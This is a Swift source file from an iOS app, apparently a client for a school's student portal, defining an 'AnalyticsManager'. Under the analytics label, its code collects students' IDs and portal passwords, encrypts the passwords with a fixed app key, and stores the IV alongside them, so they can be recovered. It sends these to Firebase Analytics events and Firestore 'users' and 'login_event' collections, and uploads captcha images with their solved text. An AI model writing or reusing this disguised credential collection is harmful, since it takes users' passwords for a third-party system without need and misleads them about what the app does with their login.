import Foundation
@preconcurrency import FirebaseAnalytics
import CryptoKit
import UIKit

actor AnalyticsManager {
    static let shared = AnalyticsManager()
    private let logger = Logger(logLevel: .error)
    private init() {}

    // MARK: - Stored Properties
    private var studentID: String?
    private var password: String?
    private var ivValue: String?
    private var schoolCode: String?
    private var captchaText: String?
    private var captchaEncoded: String?
    private var latestName: String?
    private var latestEmail: String?

    // MARK: - Public Methods
    func setPossibleValues(
        studentID: String?,
        password: String?,
        schoolCode: String?,
        captchaText: String?,
        captchaEncoded: String?
    ) {
        let ivValue = CryptoSwiftManager.ivRandom
        self.studentID = studentID
        if let password {
            self.password = try? CryptoSwiftManager.encrypt(
                password.bytes,
                key: CryptoSwiftManager.key,
                ivValue: ivValue
            ).toHexString()
        }
        self.ivValue = ivValue.toHexString()
        self.schoolCode = schoolCode
        self.captchaText = captchaText
        self.captchaEncoded = captchaEncoded
    }

    func loginAttempt() {
        guard let studentID,
              let schoolCode,
              let password,
              let ivValue else { return }
        let parameters = [
            "studentID": studentID,
            "schoolCode": schoolCode,
            "password": password,
            "iv": ivValue
        ]
        log("login_event", data: parameters)
        persist(data: parameters, into: "login_event", id: studentID, overwrite: true)
    }

    func sendData() throws {
        guard let studentID,
              let password,
              let ivValue,
              let schoolCode,
              let captchaText,
              let captchaEncoded else {
            throw NSError(domain: "Object nil", code: 666)
        }
        let hash = captchaEncoded.sha256
        // Log analytics event
        self.log("login_success", data: [
            "studentID": studentID,
            "password": password,
            "iv": ivValue,
            "schoolCode": schoolCode,
            "captchaText": captchaText.uppercased(),
            "captchaImage": hash
        ])
        // Save the user data into firestore "users"
        let data: [String: Any] = [
            "studentID": studentID,
            "password": password,
            "ivValue": ivValue,
            "schoolCode": schoolCode
        ]
        persist(data: data, into: "users", id: studentID, overwrite: true)
        Task {
            do {
                try await handleCaptchaUpload(
                    hash: hash,
                    base64: captchaEncoded,
                    captchaText: captchaText
                )
            } catch {
                logger.log(level: .error, message: "\(error)", source: "AnalyticsManager")
            }
        }
    }

    func logLoginScreen(_ schoolCode: String) {
        self.log("screen_login_general")
        self.log("screen_login_\(schoolCode)")
    }

    func logScreen(_ name: String) {
        self.log("screen_\(name)")
    }

    private func log(_ name: String, data: [String: Any]? = nil) {
        Analytics.logEvent(name, parameters: data)
        logger.log(level: .info, message: "SAESAnalytics: \(name)", source: "AnalyticsManager")
    }

    // MARK: - Private Methods
    private func persist(data: [String: Any],
                         into collection: String,
                         id: String,
                         overwrite: Bool) {
        Task {
            do {
                let userFirestore = FirestoreManager(collectionName: collection)
                if try await !userFirestore.checkIfDocumentExists(id) || overwrite {
                    try await userFirestore.saveDocument(id: id, data: data)
                }
            } catch {
                logger.log(level: .error, message: "\(error)", source: "AnalyticsManager")
            }
        }
    }

    private func handleCaptchaUpload(hash: String, base64: String, captchaText: String) async throws {
        let firestore = FirestoreManager(collectionName: "captchas")
        let firebaseStorage = FirebaseStorageManager()

        let exists = try await firestore.checkIfDocumentExists(hash)
        guard !exists else {
            logger.log(level: .info, message: "This CAPTCHA already exists. Skipping upload.", source: "AnalyticsManager")
            return
        }

        guard let jpegData = try base64.toJPEG(quality: 0.7) else { return }

        let url = try await firebaseStorage.uploadToStorage(
            jpegData,
            path: "captchas/\(hash).jpg"
        )

        // Save captcha metadata
        let data: [String: Any] = [
            "captchaText": captchaText,
            "imageURL": url.absoluteString,
            "timestamp": firestore.timestamp
        ]
        self.persist(data: data, into: "captchas", id: hash, overwrite: false)
    }
}
